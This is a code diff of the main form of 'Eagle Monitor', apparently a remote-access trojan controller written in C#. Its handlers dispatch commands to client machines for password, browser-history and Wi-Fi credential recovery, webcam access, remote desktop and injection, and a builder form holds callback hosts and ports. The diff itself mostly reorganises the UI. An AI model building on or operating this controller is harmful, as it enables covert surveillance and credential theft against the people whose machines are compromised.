@@ -1,6 +1,7 @@
 ﻿using Eagle_Monitor.Clients;
 using Eagle_Monitor.Controls;
 using Eagle_Monitor.Forms;
+using Eagle_Monitor.Helpers;
 using Microsoft.VisualBasic;
 using Newtonsoft.Json;
 using Shared;
@@ -8,6 +9,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -28,25 +30,33 @@ namespace Eagle_Monitor
             InitializeComponent();
         }
 
-        private MetroDropShadow metroDropShadow;
+        //private MetroDropShadow metroDropShadow;
         public static BuilderForm B = new BuilderForm();
         public static AboutForm A = new AboutForm();
 
+
+        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
+        public extern static int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
+
+
+
         private void Main_Load(object sender, EventArgs e)
         {
+            //SetWindowTheme(clientsListView.Handle, "explorer", null);
             ControlsDrawing.FixControls();
             testNewFeaturesToolStripMenuItem.Visible = false;//Test new features or plugins;
 
             Utilities.AnimateWindow(this.Handle, 500, Utilities.dwFlags.AW_BLEND);
-            metroDropShadow = new MetroDropShadow(this);
+            //metroDropShadow = new MetroDropShadow(this); involves high cpu usage sometimes
             ControlsDrawing.Enable(clientsListView);
             ControlsDrawing.Enable(tasksListView);
             ControlsDrawing.Enable(massListView);
-            ControlsDrawing.Enable(logsListView);
             ControlsDrawing.Enable(windowsTabControls1);
             ControlsDrawing.Enable(clientMenuStrip);
             ControlsDrawing.Enable(tasksContextMenuStrip);
             ControlsDrawing.Enable(label2);
+
+            //SetWindowTheme(clientsListView.Handle, "explorer", null);
 
             new Thread(() => 
             {
@@ -235,7 +245,10 @@ namespace Eagle_Monitor
             new SenderClient.DataSender(SenderClient.HibernateClientComputer).Invoke();
         }
 
-
+        private void computerInformationToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new SenderClient.DataSender(SenderClient.ComputerInformation).Invoke();
+        }
 
         private void algoComboBox_SelectedIndexChanged(object sender, EventArgs e)
         {
@@ -505,81 +518,6 @@ namespace Eagle_Monitor
             catch {}
         }   
 
-        private void passwordsRecoveryPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.RecoveryPasswords).Invoke();
-        }
-
-        private void historyRecoveryPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.RecoveryHistory).Invoke();
-        }
-
-        private void wifiRecoveryPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.RecoveryWifiPasswords).Invoke();
-        }
-
-        private void processManagerPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.ProcessManager).Invoke();
-        }
-        private void fileManagerPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.FileManager).Invoke();
-        }
-
-        private void remoteDesktopPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.RemoteDesktop).Invoke();
-        }
-
-        private void injectionPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.Injection).Invoke();
-        }
-
-        private void panelPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.Panel).Invoke();
-        }
-
-        private void webCamPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.WebCam).Invoke();
-        }
-
-        private void closeClientPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.CloseClient).Invoke();
-        }
-
-        private void shutDownPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.ShutdownClientComputer).Invoke();
-        }
-
-        private void rebootPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.RebootClientComputer).Invoke();
-        }
-
-        private void logOutPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.LogoutClientComputer).Invoke();
-        }
-
-        private void suspendPictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.SuspendClientComputer).Invoke();
-        }
-
-        private void hibernatePictureBox_Click(object sender, EventArgs e)
-        {
-            new SenderClient.DataSender(SenderClient.HibernateClientComputer).Invoke();
-        }
-
-
         private void passwordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
         {
             //Utilities.TaskToAdd("PassRecovery", new List<string> { "Passwords Recovery"  , "NONE" });
@@ -692,10 +630,23 @@ namespace Eagle_Monitor
             try
             {
                 Main.B.Show();
+                for (int i = 0; i < BuilderHelper.builderSetting.hostBuilder.Count; i++)
+                {
+                    ListViewItem I = new ListViewItem(BuilderHelper.builderSetting.hostBuilder[i]);
+                    I.SubItems.Add(BuilderHelper.builderSetting.hostPortBuilder[i].ToString());
+                    B.hostsListView.Items.Add(I);
+                }
             }
             catch (Exception)
             {
                 Main.B = new BuilderForm(); Main.B.Show();
+
+                for (int i = 0; i < BuilderHelper.builderSetting.hostBuilder.Count; i++) 
+                {
+                    ListViewItem I = new ListViewItem(BuilderHelper.builderSetting.hostBuilder[i]);
+                    I.SubItems.Add(BuilderHelper.builderSetting.hostPortBuilder[i].ToString());
+                    B.hostsListView.Items.Add(I);
+                }
             }
         }
 
@@ -790,18 +741,6 @@ namespace Eagle_Monitor
             }
         }
 
-        private void builderPictureBox_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                Main.B.Show();
-            }
-            catch (Exception)
-            {
-                Main.B = new BuilderForm(); Main.B.Show();
-            }
-        }
-
         //Test for new plugin or new feature
         private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
         {
@@ -809,11 +748,11 @@ namespace Eagle_Monitor
             {
                 Client C = Client.ClientDictionary[I.SubItems[1].Text];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Miscellaneous;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.MS_OFF };
+                D.DataReturn = new object[] { Shared.PacketType.MS_OFF };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -824,11 +763,11 @@ namespace Eagle_Monitor
             {
                 Client C = Client.ClientDictionary[I.SubItems[1].Text];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.Miscellaneous;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.MS_ON };
+                D.DataReturn = new object[] { Shared.PacketType.MS_ON };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
